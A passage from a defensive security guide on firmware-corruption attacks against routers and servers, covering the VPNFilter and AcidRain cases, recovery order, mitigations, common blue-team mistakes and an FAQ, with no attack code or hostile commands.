  2. Factory reset — removes stage 1, which persists in flash. This is the step a rushed admin skips, leaving the malware able to re-download itself.
  3. Firmware update — closes the way in, so the reset is not wasted.
  4. Credential change — because the operators harvested admin credentials from site traffic; a clean device with a stolen password is re-infected on schedule.

Communicate the sequence loudly. During the incident, the most common user error was stopping after step 1 and declaring the network clean.

Recovery

Recovery for most users was a weekend of reboots and resets. For owners of bricked devices it was hardware replacement — real money for small offices, and weeks of queues for popular models. There were no off-device configs to restore for typical home users, so every reset also meant reconfiguring the network from scratch.

What a victim SOC could have done

Most affected owners were homes and small offices without a SOC. An enterprise watching the same pattern in its managed fleet had real options, and each maps to a section of this guide:

  • Alert on management sessions from unknown sources (Section 2, step 2; TH-01 rule).
  • Alert on image copies to flash from non-approved hosts (TH-01 rule).
  • Treat a multi-site down-burst as one security incident (TH-02 rule).
  • Keep off-device config backups so recovery means restore, not rebuild (Section 7).

Evidence that survives the brick

Even when a device is dead, the incident is not unwitnessed. Collect in this order:

  • Off-box logs: AAA/TACACS+, manager audit, NMS history, syslog collector buffers.
  • The flash chip itself: forensics teams can read chips in a lab and recover stage-1 artifacts, as researchers did for VPNFilter.
  • Network records: NetFlow and firewall logs showing who pushed what, when.
  • Vendor records: RMA and support interactions tied to the affected models.

Impact and consequences

Roughly half a million devices were infected across 54 countries. Many were bricked during the kill stage. Homes and small businesses lost connectivity, and replacement hardware cost real money on a consumer scale. The lasting lesson: router fleets can be destroyed at internet scale. On the positive side: the coordinated disclosure-plus-seizure model worked, and it is now the template for botnet takedowns.

Team response and communication

The response worked like a relay. Researchers (Talos) held the analysis until law enforcement could act. The FBI took the C2 domain. Vendors published model lists and recovery steps. National CERTs translated and pushed advisories. ISPs passed warnings to customers. Communication was careful — advice was "reboot first, then reset, then update", because the wrong order could leave the persistent stage in flash while the owner believed the device was clean.

Lessons learned

  • Firmware is attack surface. A device that cannot log cannot defend itself; monitor device health from the network side.
  • Patch and change defaults. Most infected devices used out-of-date firmware and default or simple admin passwords.
  • Disable WAN-side management. Management exposed to the internet is how large fleets fall at once.
  • Keep spares and off-device backups. Recovery speed was set by hardware availability, not skill.
  • Coordination scales. Researchers + law enforcement + vendors contained an incident that no single victim could even see.
Secondary case — AcidRain and the Viasat KA-SAT outage, February 2022 Short sidebar, documented: SentinelOne analyzed AcidRain, a modular wiper for MIPS and ARM routers and modems, used during the Viasat KA-SAT outage at the start of the invasion of Ukraine. Tens of thousands of satellite terminals went offline in Ukraine and Europe, and wind-turbine monitoring in Germany was disrupted. The EU and US attributed the Viasat incident to Russian GRU — Medium-High confidence attribution, officially stated. AcidRain is the clearest public example of TH-02: firmware corruption at provider scale, with collateral damage far from the intended target.

What worked, what failed

What worked

  • Coordination at scale: researchers, the FBI, vendors, CERTs, and ISPs acted in the same weeks instead of in silos.
  • Reboot-then-reset-then-update advice cleared most devices correctly — a simple order mattered.
  • The sinkhole gave visibility: taking the C2 domain turned global infection into a measurable map.

What failed

  • Most victim devices had remote administration enabled and default or weak credentials — the two controls that would have stopped the flood.
  • Consumer routers rarely received updates, so known-vulnerable models stayed exposed for years.
  • Bricked units needed manual recovery or replacement, and home users had neither the tools nor the knowledge.
  • Firmware integrity was not monitored anywhere: nothing in the victims' view noticed a flash write in progress.

Evidence to preserve early

Bricked devices are evidence that talks. Before recovery starts, photograph the device state and labels, keep two bricked units offline as forensic samples, export the manager's audit log (resets and pushes), pull AAA command history for the management plane, and save the NMS alarm timeline with its maintenance-mode flags. These five artifacts let you prove scope, timing, and source — which the hardware swap will otherwise erase.

Mitigation and defense

Software updates cannot fix dead hardware. Everything below is about making firmware corruption hard to reach, loud when attempted, and fast to recover from.

Signed firmware + Secure Boot

Buy and keep devices that verify image signatures. Enable Secure Boot and measured boot on servers and endpoints. Unsigned or unverified images should fail closed.

Disable remote / WAN management

Admin interfaces must not answer from the internet. If remote management is unavoidable, restrict it to your management network with an allow-list.

Unique device credentials

No default passwords, no shared admin accounts. One credential per device per human, rotated on schedule and after any suspicion.

Segment the management plane

Put device management on its own VLAN, reachable only through a jump host with session recording. This is the TH-01/TH-06 kill switch.

Firmware inventory with hashes

Record model, firmware version, and image hash for every device. You cannot detect "wrong image" without knowing the right one.

Vendor advisory cadence

Review vendor and CERT advisories weekly; schedule firmware updates like patch Tuesday. EOL (end-of-life) devices get replaced, not tolerated.

BIOS supervisor passwords

Set them on servers and sensitive endpoints so BIOS settings and update flashing require a password — small effort, real speed bump.

Monitor flash, BMC, and AAA events

Ship device syslog, TACACS+ accounting, and iDRAC/iLO logs off-box. Alert on the Section 5 rules. Silence is an alert too.

Spares and out-of-band access

Keep spare edge routers per site and an out-of-band management path that survives the device dying. It turns days of downtime into hours.

Off-device config backups

Automatically export configs and images after every approved change. Factory resets destroy on-device evidence; your backup is the record.

Attestation in compliance checks

Add boot integrity (Secure Boot state, measured-boot values) to compliance scans so tampering surfaces in reports, not only in incidents.

Response runbook

Write the Section 4 triage flow down: who blocks the management plane, who pulls AAA, who swaps hardware, who talks to the vendor. Rehearse once a year.

Secure the update pipeline

Your own firmware-update server and manager are part of the attack surface. Sign images, verify on the device, and restrict which hosts may serve images at all. An open TFTP server near the management VLAN is an invitation.

NAC for management access

Network access control (802.1X) on the management VLAN means a stolen laptop cannot just plug in — it needs a certificate too. With this control, stolen credentials alone are no longer enough to reach the management VLAN.

Change management that covers firmware

Every firmware move needs a ticket, a window, an approver, and a rollback image. Auditors love it; attackers hate it, because their outside-window push stands out immediately.

Home and small office

  • Update your router firmware regularly — every 3 months, or when the app nags you. Turn on automatic updates if the device offers them.
  • Buy supported brands; avoid devices that stopped getting updates. Check the vendor's support list before you buy, not after.
  • Turn off remote administration from the internet — this single setting stops most consumer router attacks before they start.
  • Use a unique admin password, not the printed default, and store it in your password manager.
  • If the router dies after strange behavior: reboot once; if it is still dead, assume hardware — replace it and tell your ISP. Do not keep re-flashing a device that may be compromised.
  • Keep the box and receipt; replacement is the realistic recovery path for home gear.

The one drill that pays for this whole guide

Once a quarter, in a change window, run this 45-minute exercise with network and server teams:

  1. Pick one approved firmware upgrade and walk it backwards: ticket, approved image hash, AAA session, post-change check. Time each step.
  2. Restore one device config from the off-device backup and diff it against the running device. Any drift is a finding.
  3. Boot one lab machine with Secure Boot on and try to load an unsigned test image — confirm it fails closed, and confirm the attestation event reaches the SIEM.
  4. Fix one thing that surprised you before the next drill.

If the config restore surprises you, or the attestation event never arrives, you have found a real gap on a calm day instead of during a wiper.

Common mistakes and best practices

Twelve blue-team mistakes seen in real firmware incidents. Each card gives the symptom you notice, the root cause, the fix, and the prevention that keeps it fixed.

1. "Firmware attacks are nation-state only"

Symptom
No firmware controls exist at all; the topic never appears in risk registers.
Root cause
Ransomware crews now copy every destructive pattern that works, and Bad Rabbit already used bootloader tampering.
Fix
Add firmware integrity and management-plane controls to the current-year plan (Section 7 table).
Prevention
Annual threat-model workshop that includes T1495 with current cases.

2. No firmware or version inventory

Symptom
Nobody can say which routers run which image; "wrong image" alerts are impossible.
Root cause
Inventory stops at the OS layer; network gear is a black box.
Fix
Collect model + firmware + hash per device (SNMP, APIs, config audits) into one table.
Prevention
Include firmware fields in the CMDB import; alert on drift.

3. Management interfaces reachable from the internet

Symptom
Shodan-style scans find admin consoles; brute-force noise in logs.
Root cause
"Just for remote support" exceptions that never got removed.
Fix
Close WAN management now; allow management only from the mgmt VLAN.
Prevention
External attack-surface scan each month with management-port checks.

4. Default or shared admin credentials

Symptom
One leaked password opens 200 devices; nobody knows who did what.
Root cause
Deployment speed beats hygiene; no per-device secrets pipeline.
Fix
Rotate to unique per-device credentials stored in a vault.
Prevention
Block default creds in onboarding checklists; vault integration for config pushes.

5. Devices send no syslog or AAA records

Symptom
After an outage there is nothing to investigate — the device "kept no logs".
Root cause
Syslog and TACACS+ accounting were never configured; local logs die with the device.
Fix
Forward syslog off-box and enable command accounting for every privileged session.
Prevention
Compliance check: no device without off-box logging.

6. Monitoring only servers, never device health

Symptom
Users report the outage before the SOC sees anything.
Root cause
NMS alerts go to an ops queue, not to security; no down-burst rule.
Fix
Pipe NMS alarms into the SIEM; implement the TH-02 burst detection.
Prevention
Joint network-security review of alert routing each quarter.

7. Secure Boot off, no attestation

Symptom
Any admin can flash any image; nothing flags changed boot measurements.
Root cause
Secure Boot disabled for one old appliance years ago and never revisited.
Fix
Enable Secure Boot and measured boot fleet-wide; collect TBS/CodeIntegrity events.
Prevention
Attestation status in the compliance dashboard (Section 5.1).

8. Vendor advisories never reviewed

Symptom
Your router model appears in a disclosed campaign and nobody noticed for months.
Root cause
No owner, no cadence for vendor security bulletins.
Fix
Weekly 30-minute advisory triage with a named owner.
Prevention
Advisory source list + ticket template; EOL devices tracked as risks.

9. No spare devices

Symptom
A bricked edge router means a week of waiting for delivery.
Root cause
Spares look like idle cost until the day they are not.
Fix
Keep one configured spare per site tier; test-restore it twice a year.
Prevention
Recovery runbook names the spare, its location, and its image hash.

10. Flat network: management and user traffic together

Symptom
A phishing-fallout laptop can reach router admin pages directly.
Root cause
No VLANs for management; firewall allows "internal everything".
Fix
Separate management VLAN + jump host; deny user subnets to management IPs.
Prevention
Quarterly firewall rule review with a management-plane test.

11. No BIOS supervisor passwords

Symptom
Anyone at the keyboard can flash firmware or change boot order.
Root cause
Considered "physical access only" — until remote flashing tools arrived.
Fix
Set supervisor passwords on servers and sensitive endpoints; store in vault.
Prevention
Endpoint build checklist includes BIOS password step.

12. Mass offline events treated as "ISP problem"

Symptom
Down-burst tickets sit in the ops queue for hours; forensic evidence ages out.
Root cause
No rule connects device death with the AAA trail; security is called last.
Fix
Down-burst alerts route to security with a "check AAA before reset" step.
Prevention
Drill: simulate two bricked routers and time the triage (Section 4 flow).

Habits that keep you ready

Daily

  • Review privileged management-plane logins (user, source, time).
  • Check NMS down-alarms against AAA sessions.
  • Confirm syslog pipelines are green — silence is an alert.

Weekly

  • Vendor and CERT advisory triage for your device models.
  • Review flash-tool and bcdedit detections for hits and noise.
  • Check firmware inventory drift report.

Monthly

  • Test one config/image restore from off-device backup.
  • Verify spares still boot on the current approved image.
  • Scan the attack surface for exposed management ports.

Quick questions

Is firmware corruption the same as a disk wipe?
No — and the difference matters. A disk wipe destroys data; an OS reinstall fixes it. Firmware corruption breaks the code that starts the device, so reinstalling the OS cannot help.
Can antivirus see a flash write?
Almost never directly. What you can see is the tool doing it (flashrom, FPT, AFUWIN), the session it came from, and the device dying afterwards. That chain is what section 5.5 detects.
Should I panic about my home router?
No — but do the four basics: updates on, remote admin off, unique password, supported model. That covers the realistic home threat.
Where do I start with one hour a week?
Turn on AAA command accounting and syslog for every network device, ship it to the SIEM, and deploy the TH-01 copy-then-reload rule. Collection first — a device that cannot speak cannot be defended.
We have flat management access everywhere. What is the first fix?
Segment the management plane onto its own VLAN behind a jump host. It converts one stolen laptop into a blocked connection instead of a destroyed fleet — the single biggest change you can make.
Are BIOS passwords still worth setting?
Yes, on servers and shared machines. They will not stop a skilled attacker with physical access, but they stop casual tampering and make every legitimate BIOS change need a documented owner.
Why does recovery cost so much?
Because the damage sits below the OS. Every other incident has a software fix; this one needs hands, cables, spares, or trucks. That is the attacker's whole business model.
Can we detect the flash write itself on the device?
Some modern platforms log image-verification results to their own flash — the TH-01 rule reads exactly that. Older gear dies silently, which is why the surrounding logs (AAA, NMS, manager) carry the detection.
Does rebooting protect anything?
It clears running-memory stages, which is why the VPNFilter advice worked — but it does nothing to flash damage and nothing to boot-level persistence. Treat "reboot fixed it" as unproven, not as clean.
One sentence to remember this technique by?
If the attacker corrupts the code that starts the device, no software can save it — so watch who reaches the management plane, long before any flash write happens.
Whose problem is firmware — network or endpoint team?
Both, and that is the trap. Assign every device class an owner for firmware updates, logs, and spares before an incident assigns it for you.
